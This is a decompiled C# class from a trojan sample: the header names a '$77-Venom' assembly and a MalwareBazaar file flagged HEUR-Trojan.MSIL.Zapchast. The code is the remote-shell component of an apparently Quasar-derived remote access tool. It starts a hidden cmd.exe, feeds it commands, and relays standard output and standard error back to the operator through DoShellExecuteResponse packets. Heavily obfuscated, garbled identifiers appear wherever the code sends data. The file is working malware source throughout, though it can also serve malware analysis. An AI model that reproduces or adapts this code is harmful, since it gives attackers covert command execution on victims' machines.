// Decompiled with JetBrains decompiler
// Type: xClient.Core.Utilities.Shell
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Text;
using System.Threading;
using xClient.Core.Packets.ClientPackets;

namespace xClient.Core.Utilities
{
  public class Shell : IDisposable
  {
    private Process _prc;
    private bool _read;
    private readonly object _readLock = new object();
    private readonly object _readStreamLock = new object();
    private Encoding _encoding;
    private StreamWriter _inputWriter;

    private void CreateSession()
    {
      lock (this._readLock)
        this._read = true;
      this._encoding = Encoding.GetEncoding(CultureInfo.InstalledUICulture.TextInfo.OEMCodePage);
      this._prc = new Process()
      {
        StartInfo = new ProcessStartInfo("cmd")
        {
          UseShellExecute = false,
          RedirectStandardInput = true,
          RedirectStandardOutput = true,
          RedirectStandardError = true,
          StandardOutputEncoding = this._encoding,
          StandardErrorEncoding = this._encoding,
          CreateNoWindow = true,
          WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
          Arguments = "/K"
        }
      };
      this._prc.Start();
      this.RedirectOutputs();
      this.ExecuteCommand("chcp " + this._encoding.CodePage.ToString());
      new DoShellExecuteResponse(Environment.NewLine + ">> New Session created" + Environment.NewLine).Execute((鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨) \uFFFD\uF44D闛ꒁ赹〭惓ﳶ嘞끝ᬏ챟ᒠ痷섏\uFFFD帴脊䳙\u218D.㞸\uFFFD鼉\u283D茤䳒\u2E58ߢ喒䀡隲ᓊ봨试啔짟톥迣㻯穏);
    }

    private void RedirectOutputs()
    {
      ThreadPool.QueueUserWorkItem((WaitCallback) (_param1 => this.RedirectStandardOutput()));
      ThreadPool.QueueUserWorkItem((WaitCallback) (_param1 => this.RedirectStandardError()));
    }

    private void ReadStream(int firstCharRead, StreamReader streamReader, bool isError)
    {
      lock (this._readStreamLock)
      {
        StringBuilder textbuffer = new StringBuilder();
        textbuffer.Append((char) firstCharRead);
        while (streamReader.Peek() > -1)
        {
          int num = streamReader.Read();
          textbuffer.Append((char) num);
          if (num == 10)
            this.SendAndFlushBuffer(ref textbuffer, isError);
        }
        this.SendAndFlushBuffer(ref textbuffer, isError);
      }
    }

    private void SendAndFlushBuffer(ref StringBuilder textbuffer, bool isError)
    {
      if (textbuffer.Length == 0)
        return;
      string output = Encoding.UTF8.GetString(Encoding.Convert(this._encoding, Encoding.UTF8, this._encoding.GetBytes(textbuffer.ToString())));
      if (string.IsNullOrEmpty(output))
        return;
      if (isError)
        new DoShellExecuteResponse(output, true).Execute((鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨) \uFFFD\uF44D闛ꒁ赹〭惓ﳶ嘞끝ᬏ챟ᒠ痷섏\uFFFD帴脊䳙\u218D.㞸\uFFFD鼉\u283D茤䳒\u2E58ߢ喒䀡隲ᓊ봨试啔짟톥迣㻯穏);
      else
        new DoShellExecuteResponse(output).Execute((鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨) \uFFFD\uF44D闛ꒁ赹〭惓ﳶ嘞끝ᬏ챟ᒠ痷섏\uFFFD帴脊䳙\u218D.㞸\uFFFD鼉\u283D茤䳒\u2E58ߢ喒䀡隲ᓊ봨试啔짟톥迣㻯穏);
      textbuffer.Length = 0;
    }

    private void RedirectStandardOutput()
    {
      try
      {
        int firstCharRead;
        while (this._prc != null && !this._prc.HasExited && (firstCharRead = this._prc.StandardOutput.Read()) > -1)
          this.ReadStream(firstCharRead, this._prc.StandardOutput, false);
        lock (this._readLock)
        {
          if (this._read)
          {
            this._read = false;
            throw new ApplicationException("session unexpectedly closed");
          }
        }
      }
      catch (ObjectDisposedException ex)
      {
      }
      catch (Exception ex)
      {
        switch (ex)
        {
          case ApplicationException _:
          case InvalidOperationException _:
            new DoShellExecuteResponse(string.Format("{0}>> Session unexpectedly closed{0}", (object) Environment.NewLine), true).Execute((鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨) \uFFFD\uF44D闛ꒁ赹〭惓ﳶ嘞끝ᬏ챟ᒠ痷섏\uFFFD帴脊䳙\u218D.㞸\uFFFD鼉\u283D茤䳒\u2E58ߢ喒䀡隲ᓊ봨试啔짟톥迣㻯穏);
            this.CreateSession();
            break;
        }
      }
    }

    private void RedirectStandardError()
    {
      try
      {
        int firstCharRead;
        while (this._prc != null && !this._prc.HasExited && (firstCharRead = this._prc.StandardError.Read()) > -1)
          this.ReadStream(firstCharRead, this._prc.StandardError, true);
        lock (this._readLock)
        {
          if (this._read)
          {
            this._read = false;
            throw new ApplicationException("session unexpectedly closed");
          }
        }
      }
      catch (ObjectDisposedException ex)
      {
      }
      catch (Exception ex)
      {
        switch (ex)
        {
          case ApplicationException _:
          case InvalidOperationException _:
            new DoShellExecuteResponse(string.Format("{0}>> Session unexpectedly closed{0}", (object) Environment.NewLine), true).Execute((鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨) \uFFFD\uF44D闛ꒁ赹〭惓ﳶ嘞끝ᬏ챟ᒠ痷섏\uFFFD帴脊䳙\u218D.㞸\uFFFD鼉\u283D茤䳒\u2E58ߢ喒䀡隲ᓊ봨试啔짟톥迣㻯穏);
            this.CreateSession();
            break;
        }
      }
    }

    public bool ExecuteCommand(string command)
    {
      if (this._prc == null || this._prc.HasExited)
        this.CreateSession();
      if (this._prc == null)
        return false;
      if (this._inputWriter == null)
        this._inputWriter = new StreamWriter(this._prc.StandardInput.BaseStream, this._encoding);
      this._inputWriter.WriteLine(this._encoding.GetString(Encoding.Convert(Encoding.UTF8, this._encoding, Encoding.UTF8.GetBytes(command))));
      this._inputWriter.Flush();
      return true;
    }

    public Shell() => this.CreateSession();

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }

    protected virtual void Dispose(bool disposing)
    {
      if (!disposing)
        return;
      lock (this._readLock)
        this._read = false;
      if (this._prc == null)
        return;
      if (!this._prc.HasExited)
      {
        try
        {
          this._prc.Kill();
        }
        catch
        {
        }
      }
      this._inputWriter.Close();
      this._inputWriter = (StreamWriter) null;
      this._prc.Dispose();
      this._prc = (Process) null;
    }
  }
}
